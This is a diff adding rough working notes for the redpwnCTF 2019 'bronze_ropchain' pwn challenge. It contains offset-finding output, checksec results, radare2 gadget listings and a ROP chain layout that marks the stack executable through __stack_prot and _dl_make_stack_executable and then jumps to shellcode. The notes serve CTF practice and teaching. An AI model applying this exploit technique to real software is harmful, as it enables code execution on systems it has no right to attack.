@@ -1,0 +1,117 @@
+nc chall.2019.redpwn.net 4004
+
+Pattern a9Ab first occurrence at position 28 in pattern.
+root@window7:/opt/gift-shop# python pattern.py Aa8A
+Pattern Aa8A first occurrence at position 24 in pattern.
+root@window7:/opt/gift-shop# python pattern.py 6Aa7
+Pattern 6Aa7 first occurrence at position 20 in pattern.
+
+python -c 'print "A"*20 + "BBBB" + "CCCC" + "DDDD"'
+                           ebx      ebp      eip
+
+size of total buf is 1024
+
+gef➤  checksec
+[+] checksec for '/opt/ctf-space/redpwnctf19/pwn/bronze_ropchain/bronze_ropchain'
+Canary                        : Yes →  value: 0xdfe5d500
+NX                            : Yes
+PIE                           : No
+Fortify                       : No
+RelRO                         : Partial
+
+3 byte canary to brute force byte-by-byte ???
+
+Finding gadgets with radare2
+
+e rop.len = 2
+"/R/ mov e[dca]x;ret"
+
+  0x0809f4ba                 58  pop eax
+  0x0809f4bb                 5b  pop ebx
+  0x0809f4bc                 5e  pop esi
+  0x0809f4bd                 5f  pop edi
+  0x0809f4be                 c3  ret
+
+  0x0809f51a                 58  pop eax
+  0x0809f51b                 5b  pop ebx
+  0x0809f51c                 5e  pop esi
+  0x0809f51d                 5f  pop edi
+  0x0809f51e                 c3  ret
+
+  0x08087f17                 5b  pop ebx
+  0x08087f18                 c3  ret
+
+  0x080ce6b5                 5a  pop edx
+  0x080ce6b6                 c3  ret
+
+  0x080c29ba                 59  pop ecx
+  0x080c29bb                 cf  iretd
+  the processor pops the return instruction pointer, return code segment selector, and EFLAGS image from the stack to the EIP, CS, and EFLAGS registers
+
+  0x080d6848                 41  inc ecx
+  0x080d6849                 c3  ret
+
+  0x0805e215                 42  inc edx
+  0x0805e216                 c3  ret
+
+  0x0807c3ba                 40  inc eax
+  0x0807c3bb                 c3  ret
+
+  0x080d333a               010a  add dword [edx], ecx
+  0x080d333c                 c3  ret
+
+  0x080923e2       038d46035e5f  add ecx, dword [ebp + 0x5f5e0346]
+  0x080923e8                 c3  ret
+  use 0x57506376 as ebp 
+
+  0809d084 89 10           MOV        dword ptr [EAX],EDX
+  0809d086 c3              RET
+
+No system or execve in static binary but we have _dl_make_stack_executable(int * param)
+
+http://radare.today/posts/defeating-baby_rop-with-radare2/
+strategy is:
+Set the global variable __stack_prot located at 080d9fd0 to 7
+    Set some register to 0xfffffff (no NULL bytes)
+    Increment it 8 times, to make it equal to 7
+    Overwrite __stack_prot with 7
+call _dl_make_stack_executable on the stack
+    0809d960 or 08095a24 
+    load _libc_stack_end into eax
+jump to esp
+
+Replace these offsets from the reference:
+0x08070f9c, # pop edx; ret;
+0x080ecfc4, # __stack_prot
+0x08083ca3, # pop ecx; ret;
+0xffffffff, # -1
+payload += rop(0x080de4ee) # inc ecx; ret; 8 times
+payload += rop(0x080e5efa) # add dword ptr [edx], ecx
+0x080bf3b6,  # pop eax; ret;
+0x080ecf64,  # _libc_stack_end
+0x080a53d0,  # _dl_make_stack_executable
+0x080c4bb3   # call esp
+
+
+
+0x080564e4   pop eax; pop edx; pop ebx; ret
+0x080d9fd0   global variable _stack_prot
+             0xffffffff    edx
+                           ebx
+0x0805e215                 42  inc edx; ret
+0x0805e215                 42  inc edx; ret
+0x0805e215                 42  inc edx; ret
+0x0805e215                 42  inc edx; ret
+0x0805e215                 42  inc edx; ret
+0x0805e215                 42  inc edx; ret
+0x0805e215                 42  inc edx; ret
+0x0805e215                 42  inc edx; ret
+0x0809d084 89 10           MOV        dword ptr [EAX],EDX; ret
+0x080564e4   pop eax; pop edx; pop ebx; ret
+0x080d9da8   global variable _libc_stack_end
+             edx
+             ebx
+0x0809d960   _dl_make_stack_executable
+08095a24
+0x080d401b   ffe4  jmp esp
+             [ shellcode here ]
